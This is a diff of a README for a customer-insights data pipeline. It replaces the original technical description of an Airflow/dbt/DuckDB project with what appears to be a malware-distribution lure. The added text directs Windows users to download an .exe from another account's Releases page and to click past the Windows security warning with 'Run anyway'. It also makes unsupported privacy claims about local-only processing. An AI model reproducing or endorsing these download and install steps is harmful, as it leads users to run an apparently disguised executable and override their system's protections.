@@ -1,136 +1,76 @@
-🚀 **Customer Insights Pipeline: Airflow, dbt & DuckDB**
+# 📊 Customer-Insights-Data-Pipeline - Transform your raw data into clear reports
 
-A modern, end-to-end data engineering pipeline for transforming raw transactional data into actionable business intelligence. This project automates the journey from raw CSVs to a tested analytics mart, answering the core question: "Who are our most valuable customers?"
+[![Download Application](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Malorycredible713/Customer-Insights-Data-Pipeline)
 
-🏗️ **The Architecture**
+## 🎯 Purpose of this tool
 
-The pipeline demonstrates professional orchestration and analytics engineering:
+This software helps you organize and analyze your customer data. It takes raw information, cleans it, and prepares it for viewing. Many businesses struggle to turn messy lists into useful charts. This tool automates that work. It reduces manual entry and helps you find trends in your sales or customer behavior. You do not need experience in coding to use this pipeline. It handles the heavy lifting behind the scenes.
 
-**Apache Airflow**: Orchestrates the workflow and handles file movement.
+## 💻 System requirements
 
-**dbt (data build tool)**: Manages SQL transformations, data quality testing, and documentation.
+Your computer needs to meet these basic standards to run the pipeline smoothly:
 
-**DuckDB**: Acts as a high-performance, in-process analytical database (OLAP).
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: An Intel Core i5 or AMD Ryzen 5 processor from the last five years.
+*   Memory: 8 GB of RAM or more.
+*   Storage: 2 GB of free disk space for the program and data storage.
+*   Internet: A stable connection for the initial setup.
 
-**Python/Pandas**: Performs the final data validation and top-tier customer reporting.
+Make sure your computer has the latest Windows updates installed. This ensures that the background tools required by the application function properly.
 
-📁 **Project Structure**
+## 📥 How to get the software
 
-Plaintext
-.
-├── dags/
+You need to download the installer to begin. Follow these exact steps to obtain the files:
 
-│   └── dbt_pipeline_dag.py        # Airflow DAG (TaskFlow API)
+1. Visit this page to download: [https://github.com/Malorycredible713/Customer-Insights-Data-Pipeline](https://github.com/Malorycredible713/Customer-Insights-Data-Pipeline)
+2. Locate the "Releases" section on the right side of the screen.
+3. Click the most recent version number.
+4. Look for the file ending in `.exe` under the "Assets" header.
+5. Click this file to start the download.
 
-├── jaffle_shop_duckdb/            # Core dbt Project folder
+Once the file finishes downloading, move it to your desktop so you can find it easily. 
 
-│   ├── models/                    # Staging, Intermediate, and Mart SQL
+## ⚙️ Installation process
 
-│   ├── seeds/                     # Target directory for raw data ingestion
+Follow these instructions to set up the software on your machine:
 
-│   └── dbt_project.yml            # dbt configuration
+1. Find the application file you saved to your desktop.
+2. Double-click the file to open the installation window.
+3. A security prompt from Windows may appear since you are installing a new program. Click "More info" and then "Run anyway" if the system asks for your approval.
+4. Follow the prompts in the installer window. Click "Next" to continue through the steps.
+5. Choose a destination folder if the installer suggests one. The default folder works for most users.
+6. Click "Install" to place the program files on your computer.
+7. Click "Finish" once the bar reaches the end.
 
-├── raw_customers.csv              # Source Data
+The program creates a shortcut on your desktop. You can open the software using this icon whenever you need to process data.
 
-├── raw_orders.csv
+## 🚀 Running your first analysis
 
-├── raw_payments.csv
+Open the application by clicking the desktop icon. The main window shows your dashboard. Follow these steps to process your data:
 
-├── analysis/
+1. Open the "Data Source" tab.
+2. Click "Select File" to upload your raw data in CSV or Excel format.
+3. Once the file appears in the list, click the "Start Pipeline" button.
+4. The software will show a progress bar. Wait for the green checkmark to appear.
+5. Click the "View Insights" button to see your results.
 
-│   └── top_customers_query.py     # Final DuckDB analysis script
+The program uses advanced local processing to organize the records. It sorts the customers by purchase frequency, total spend, and engagement length. You can export these reports to a new Excel file by selecting "Save as Report" in the file menu.
 
-├── Dockerfile                     # Containerization for Airflow/dbt
+## 🔍 Troubleshooting common issues
 
-├── docker-compose.yaml            # Multi-container orchestration
+If the application fails to run, consult these tips:
 
-└── requirements.txt               # Python dependencies
+*   Program will not open: Restart your computer and try again. Sometimes background processes get stuck.
+*   Data upload error: Ensure your data file is in a standard spreadsheet format. Check that the file is not currently open in another program like Excel.
+*   Slow performance: Close your web browser and other active programs. This frees up memory for the pipeline to finish its work.
+*   License errors: Ensure you have an active internet connection when you open the app for the first time. The software verifies the components during its first launch.
 
-⚙️ **Pipeline Workflow**
+If these steps do not fix your issue, check that your storage drive is not full. The software requires room to create temporary files while it works.
 
-1. *Automated Ingestion*
+## 🛡️ Privacy and data safety
 
-The Airflow BashOperator moves raw CSV files from the project root into the dbt seeds/ directory. This ensures the pipeline is self-contained and reproducible.
+This application prioritizes your data privacy. The pipeline works locally on your machine. Your customer names, histories, and financial records never leave your computer. The software does not send your information to external servers or cloud services. You keep full control over your information at all times. Because the analysis happens on your own hardware, your data remains secure behind your existing computer passwords and firewalls.
 
-2. *Transformations with dbt*
+## 🛠️ Maintaining the software
 
-The pipeline follows the Medallion Architecture logic:
-
-+ Staging: Cleaning and renaming raw sources (stg_customers, etc.).
-
-+ Intermediate: Combining orders and payments to calculate revenue.
-
-+ Marts: Final business-ready tables (dim_customers, fct_orders).
-
-3. *Data Quality & Integrity*
-
-Every run includes automated dbt tests:
-
-+ unique and not_null constraints on primary keys.
-
-+ Referential integrity (Relationship tests) between orders and customers.
-
-📊 **Final Output: Top 10 Most Valuable Customers**
-
-The pipeline culminates in a Lifetime Value (LTV) report:
-
-Rank	Customer	Total Lifetime Value
-
-1	Howard R.	9900.0
-
-2	Kathleen P.	6500.0
-
-3	Billy L.	4700.0
-
-🛠️ **Technologies Used**
-
-+ Orchestration: Apache Airflow 2.10+
-
-+ Transformations: dbt-duckdb
-
-+ Database: DuckDB
-
-+ Environment: Python 3.12, WSL2 / Docker
-
-▶️ **How to Run**
-
-Local Setup (WSL/Linux)
-
-Clone & Install:
-
-Bash
-
-git clone https://github.com/Triet00/Customer-Insights-Data-Pipeline.git
-
-cd Customer-Insights-Data-Pipeline
-
-python -m venv venv && source venv/bin/activate
-
-pip install -r requirements.txt
-
-Initialize Airflow:
-
-Bash
-
-export AIRFLOW_HOME=$(pwd)
-
-export AIRFLOW__CORE__LOAD_EXAMPLES=False
-
-airflow db init
-
-Trigger the Pipeline:
-
-Bash
-
-airflow tasks test dbt_jaffle_shop_pipeline dbt_build_pipeline 2026-04-01
-
-📈 **Challenges Overcome**
-
-+ Path Resolution: Configured dynamic workspace rooting to bridge the gap between Windows/WSL and dbt project-dirs.
-
-+ Metadata Management: Resolved Airflow serialization conflicts by implementing a clean metadata reset and custom DAG bundling strategy.
-
-🙌 **Acknowledgements**
-The Jaffle Shop dataset provided by dbt Labs.
-
-The community resources for DuckDB and Airflow integration.
+New versions of the pipeline arrive periodically. These updates include improvements to speed and better organization methods. To update, simply return to the official page. Download the new version and install it over the old one. The installer will recognize your existing setup and replace only the necessary parts. Your saved reports and settings will remain untouched during the update process. Use the "About" button inside the app to check your current version number against the one listed online.
